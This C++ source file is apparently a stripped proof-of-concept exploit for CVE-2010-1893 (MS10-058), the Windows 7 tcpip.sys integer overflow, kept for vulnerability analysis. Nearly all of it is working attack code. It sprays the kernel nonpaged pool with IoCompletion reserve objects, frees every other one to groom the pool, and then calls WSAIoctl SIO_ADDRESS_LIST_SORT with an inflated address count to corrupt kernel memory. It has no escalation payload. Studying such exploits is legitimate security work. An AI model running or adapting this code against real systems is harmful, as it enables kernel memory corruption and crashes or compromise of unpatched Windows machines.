/*
	CVE-2010-1893 MS10-058 Initial Analysis

	Exploit:	Fetiveau, Jeremy. "MS10-058.cpp." 3 Mar. 2014. Web. <https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp>.

	Desc:		Stripped Jeremy's exploit for initial analysis
	OS:			Microsoft Windows 7 Ultimate 
	Component:	tcpip.sys (6.1.7600.16385)
	IDE:		Microsoft Visual Studio 2010

	Note:		Link Ws2_32.lib (Properties -> Linker -> Additional Dependencies)
*/
#include "stdafx.h"
#include "Winsock2.h"

#define IOCO 1
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS (__stdcall *NtAllocateReserveObject_t) (OUT PHANDLE hObject, IN POBJECT_ATTRIBUTES ObjectAttributes, IN DWORD ObjectType);
typedef NTSTATUS (__stdcall *NtQueueApcThreadEx_t)(IN HANDLE hThread, IN HANDLE hApcReserve, IN PVOID ApcRoutine, IN PVOID ApcArgument1, IN PVOID ApcArgument2, IN PVOID ApcArgument3);
typedef NTSTATUS (__stdcall *NtSetIoCompletionEx_t)(IN HANDLE IoCompletionHandle, IN HANDLE hReserveObject, IN PVOID KeyContext, IN PVOID ApcContext, IN NTSTATUS IoStatus, ULONG_PTR IoStatusInformation);
typedef NTSTATUS (__stdcall *NtCreateIoCompletion_t)(OUT PHANDLE IoCompletionHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN ULONG NumberOfConcurrentThreads); 
typedef NTSTATUS (__stdcall *NtAllocateVirtualMemory_t)(IN HANDLE ProcessHandle,IN OUT PVOID *BaseAddress,IN ULONG ZeroBits, IN OUT PULONG AllocationSize, IN ULONG AllocationType, IN ULONG Protect);
typedef NTSTATUS (__stdcall *NtQueryIntervalProfile_t)(UINT, PULONG);

NtAllocateReserveObject_t NtAllocateReserveObject;
NtQueueApcThreadEx_t NtQueueApcThreadEx;
NtSetIoCompletionEx_t NtSetIoCompletionEx;
NtCreateIoCompletion_t NtCreateIoCompletion;
NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
NtQueryIntervalProfile_t NtQueryIntervalProfile;


HANDLE hObject[10000];
HANDLE hObjectA[5000];
HANDLE hObjectB[5000];


int sprayIoCo()
{
	NTSTATUS st;
	HMODULE h;
	INT i = 0;

	h = LoadLibraryA("ntdll.dll");

	if (!h) {
		printf("[-]Failed to load module\n");
		exit(1);
	}

	NtAllocateReserveObject = (NtAllocateReserveObject_t)GetProcAddress(h, "NtAllocateReserveObject");
	NtSetIoCompletionEx = (NtSetIoCompletionEx_t)GetProcAddress(h, "NtSetIoCompletionEx");
	NtCreateIoCompletion = (NtCreateIoCompletion_t)GetProcAddress(h, "NtCreateIoCompletion");

	if (!NtAllocateReserveObject) {
		printf("[-]Failed to get the address of NtAllocateReserveObject %08x\n", GetLastError());
		exit(1);
	}

	if (!NtSetIoCompletionEx) {
		printf("[-]Failed to get the address of NtSetIoCompletionEx %08x\n", GetLastError());
		exit(1);
	}

	if (!NtCreateIoCompletion) {
		printf("[-]Failed to get the address of NtCreateIoCompletion %08x\n", GetLastError());
		exit(1);
	}

	printf("[+]Spraying np pool with IoCo reserve objects 1/2\n");

	for (i = 0; i < 10000; ++i) {
		st = NtAllocateReserveObject(&hObject[i], 0, IOCO);
		if (!NT_SUCCESS(st)) {
			printf("[-]Failed to allocate on the pool, %08x %08x\n", GetLastError(),st);
			exit(1);
		}
	}

	printf("[+]Spraying np pool with IoCo reserve objects 2/2\n");

	for (i = 0; i < 5000; ++i) {
		st = NtAllocateReserveObject(&hObjectA[i], 0, IOCO);
		if (!NT_SUCCESS(st)) {
			printf("[-]Failed to allocate on the pool, %08x %08x\n", GetLastError(),st);
			exit(1);
		}

		st = NtAllocateReserveObject(&hObjectB[i], 0, IOCO);
		if (!NT_SUCCESS(st)) {
			printf("[-]Failed to allocate on the pool, %08x %08x\n", GetLastError(),st);
			exit(1);
		}

		
	}
	for (i = 0; i < 5000; ++i) {
		if (!CloseHandle(hObjectA[i])) {
			printf("[-]Failed to close reserve object handle\n");
			exit(1);
		}
	}

	printf("[+]Done spraying\n");

	return 0;
}

int main(void)
{
	WSADATA wd = { 0 };
	SOCKET sock = 0;
	SOCKET_ADDRESS_LIST *pwn = (SOCKET_ADDRESS_LIST*)malloc(sizeof(INT) + 4 * sizeof(SOCKET_ADDRESS));
	DWORD cb;
	CHAR buffer[0x1c];
	SOCKET_ADDRESS sa;

	memset(buffer, 0x41, 0x1c);

	buffer[0] = 0x17;
	buffer[1] = 0x00;

	sa.lpSockaddr = (LPSOCKADDR)buffer;
	sa.iSockaddrLength = 0x1c;
	pwn->iAddressCount = 0x40000003;

	memcpy(&pwn->Address[0], &sa, sizeof(_SOCKET_ADDRESS));
	memcpy(&pwn->Address[1], &sa, sizeof(_SOCKET_ADDRESS));
	memcpy(&pwn->Address[2], &sa, sizeof(_SOCKET_ADDRESS));
	memcpy(&pwn->Address[3], &sa, sizeof(_SOCKET_ADDRESS));

	WSAStartup(MAKEWORD(2, 0), &wd);
	sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

	sprayIoCo();

	if (sock == INVALID_SOCKET) {
		printf("[-] Failed to create socket (%08x)\n", WSAGetLastError());
		exit(1);
	}

	if (WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &cb, NULL, NULL)){
		printf("[+] WSAIoctl succeeded");
	} else {
		printf("[-] WSAIoctl failed");
	}

	return 0;
}

